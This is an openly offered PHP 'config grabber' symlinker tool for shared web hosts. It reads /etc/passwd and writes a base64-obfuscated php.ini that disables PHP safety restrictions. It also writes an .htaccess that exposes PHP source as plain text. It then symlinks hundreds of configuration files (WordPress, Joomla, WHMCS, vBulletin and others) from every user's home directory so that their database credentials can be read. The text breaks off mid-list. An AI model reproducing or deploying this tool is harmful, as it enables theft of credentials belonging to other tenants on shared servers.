<!DOCTYPE html>
<html>
    <head>
        <title>An0n 3xPloiTeR C0nfIG Gr4bb3r</title>
        <link rel='SHORTCUT ICON' href='http://i66.tinypic.com/2j33a85.jpg' />
        <meta charset="UTF-8" />
        <meta name="description" content="An0n 3xPloiTeR C0nfIG Gr4bb3r" />
        <meta name="location" content="An0n 3xPloiTeR C0nfIG Gr4bb3r" />
        <meta http-equiv="refresh" content="3600"><!-- For Refreshing Page After 3600 Intervals of time -->
        <meta name="working" content="An0n 3xPloiTeR C0nfIG Gr4bb3r" />
        <meta name="about" content="An0n 3xPloiTeR C0nfIG Gr4bb3r" />
        <meta name="author" content="An0n 3xPloiTeR, Umar Arfeen Shah" />
        <meta name="keywords" content="An0n, 3xPloiTeR, C0NFIG, Gr4bb3r, An0n 3xPloiTeR C0nfIG Gr4bb3r" />
        <meta name="revisit-after" content="1200" />
        <meta name="language" content="en" />
        <meta name='rating' content='general' />
        <meta name='generator' content='google' />
        <meta name='msnbot' content='follow,all' />
        <meta name='alexabot' content='follow,all' />
        <meta name='geo.placename' content='pakistan' />
        <meta name="googlebot" content="index,follow,all" />
        <meta http-equiv="X-UA-Compatible" content="IE-edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name='search engines' content='Aeiwi,Alexa,AllTheWeb,AltaVista,AOLNetfind,Anzwers,Canada,DirectHit,EuroSeek,Excite,Overture,Go,Google,HotBot InfoMak,Kanoodle,Lycos,MachineSite,National Directory,Northern Light,SearchIt,SimpleSearch,WebsMostLinked,WebTop,What-U-Seek,AOL,Yahoo,WebCrawler,Infoseek,Excite,Magellan,LookSmart,bing,CNET,Googlebot' />
        <script language='JavaScript1.2'>
            function ejs_nodroit(){
                alert ('An0n 3xPloiTeR C0nfIG Gr4bb3r');
                alert ('Made By An0n 3xPloiTeR');
                alert ('Although There Are No Copyrights But You Aren\'t Supposed To Copy My Code :\'(');
                alert ('Got Your Ip: <?php $ip_address = $_SERVER["REMOTE_ADDR"]; echo $ip_address; ?> And Reported To An0n 3xPloiTeR :-)');
                return(false);
            }
            document.oncontextmenu = ejs_nodroit;
        </script>
        <style>
            body {
                background-color: #080510;
            }
            a {
                color: red;
                text-decoration: none;
            }
            a:hover {
                color: teal;
            }
            .heading {
                text-align: center;
                font: 300% impact;
                margin-top: 1vh;
            }
            .server_info {
                text-align: center;
                font-size: 110%;
                margin-top: 2vh;
                color: lawngreen;
                font-family: cursive;
            }
            .safe_mode_on {
                text-align: center;
                font-size: 100%;
                color: red;
                font-family: cursive;
            }
            .safe_mode_off {
                text-align: center;
                font-size: 100%;
                color: green;
                font-family: cursive;
            }
            .symlinker {
                text-align: center;
                font-size: 110%;
                margin-top: 2vh;
                color: lawngreen;
                font-family: cursive;
            }
            .symlink_done {
                text-align: center;
                font-size: 120%;
                margin-top: 2vh;
                color: lawngreen;
                font-family: cursive;
            }
            .footer {
                text-align: center;
                font: 25px impact;
                color: white;
                position: fixed;
                bottom: 1vh;
                left: 0vh;
                right: 0vh;
            }
        </style>
    </head>
    <body>
        <div class="heading">
            <font>
                <span style="color: white;">Symlinker By</span> 
                <span style="color: red;">An0n 3xPloiTeR</span>
            </font>
        </div>
        <div class="server_info">
            <font>
                <?php 
                    echo "<span style='color: green;'>Uname:</span> ".$server_name = php_uname();
                    echo "<br>";
                    echo "<span style='color: green;'>Server Software:</span> ".$server_software = $_SERVER['SERVER_SOFTWARE'];
                    $safe_mode = ini_get("safe_mode");
                    if ($safe_mode == "1") {
                        echo "<div class='safe_mode_on'><font>Safe Mode: On</font></div>";
                    } else {
                        echo "<div class='safe_mode_off'><font>Safe Mode: <span style='color: lawngreen;'>Off</span></font></div>";
                    }
                ?>
            </font>
        </div>
        <div class="symlinker">
            <font>
                <?php
                    echo "
                    <form action='' method='POST'>
                        <input style='margin-top: 10vh; font: 130% impact; background: green; border-radius: 4px; border: 1px solid lime; color: white; line-height:40px; padding-left:10px;padding-right:10px;' type='submit' name='submit' value='Click To Start Symlinking' />
                        <textarea name='passwd' style='display:none;' rows='11' cols='90'>";
                            echo file_get_contents('/etc/passwd');
                        echo "</textarea>
                    </form>
                    ";

                    if (isset($_POST['submit'])) {
                        $php_ini_content = "c2FmZV9tb2RlID0gT0ZGCglTYWZlX21vZGVfZ2lkID0gT0ZGCglkaXNhYmxlX2Z1bmN0aW9ucyA9IE5PTkUKCWRpc2FibGVfY2xhc3NlcyA9IE5PTkUKCW9wZW5fYmFzZWRpciA9IE9GRgoJc3Vob3Npbi5leGVjdXRvci5mdW5jLmJsYWNrbGlzdCA9IE5PTkUg";
                        $php_ini = fopen("php.ini", "w");
                        fwrite($php_ini, base64_decode($php_ini_content));
                        fclose($php_ini);

                        $function = @ini_get("disable_functions");
                        if (eregi("symlink", $function)) {
                            die('<error>Symlink is disabled :\'( </error>');
                        } else {
                            @mkdir('UeXploiT', 0755);
                            @chdir('UeXploiT');                        
                            $passwd = $_POST["passwd"];

                        $htaccess_content = "T1BUSU9OUyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzIFN5bUxpbmtzSWZPd25lck1hdGNoIEluY2x1ZGVzIEluY2x1ZGVzTk9FWEVDIEV4ZWNDR0kKT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzCkZvcmNlVHlwZSB0ZXh0L3BsYWluCkFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIApBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwKQWRkVHlwZSB0ZXh0L2h0bWwgLnNodG1sCkFkZFR5cGUgdHh0IC5waHAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAKQWRkSGFuZGxlciB0eHQgLnBocApBZGRIYW5kbGVyIHR4dCAuaHRtbApBZGRIYW5kbGVyIHR4dCAuc2h0bWwKT3B0aW9ucyBBbGwKT3B0aW9ucyBBbGw=";
                        $htaccess = fopen(".htaccess", "w");
                        fwrite($htaccess, base64_decode($htaccess_content));
                        fclose($htaccess);

                            $passwd = explode("
", $passwd);
                            foreach ($passwd as $pwd) {
                                $pawd = explode(":", $pwd);
                                $user = $pawd[0];
@symlink('/home/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home/' . $user . '/public_html/home/wp-config.php', $user . '-wp-home.txt');
@symlink('/home/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home/' . $user . '/public_html/home/configuration.php', $user . '-joomla-home.txt');
@symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/db.php', $user . '-clientarea-WHMCS.txt');
@symlink('/home/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home/' . $user . '/public_html/connection.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home2/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home2/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home2/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home2/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home2/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home2/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home2/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home2/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home2/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home2/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home2/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home2/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home2/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home2/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home2/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home2/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home2/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home2/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home2/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home2/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home2/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home2/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home2/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home2/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home2/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home2/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home2/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home2/' . $user . '/public_html/home2/wp-config.php', $user . '-wp-home2.txt');
@symlink('/home2/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home2/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home2/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home2/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home2/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home2/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home2/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home2/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home2/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home2/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home2/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home2/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home2/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home2/' . $user . '/public_html/home2/configuration.php', $user . '-joomla-home2.txt');
@symlink('/home2/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home2/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home2/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home2/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home2/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home2/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home2/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home2/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home2/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home2/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home2/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home2/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home2/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home2/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home2/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home2/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home2/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home2/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home2/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home2/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home2/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home2/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home2/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home2/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home2/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home2/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home2/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home2/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home2/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home2/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home2/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home2/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home2/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home2/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home2/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home2/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home2/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home2/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home2/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home2/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home2/' . $user . '/public_html/db.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home2/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home2/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
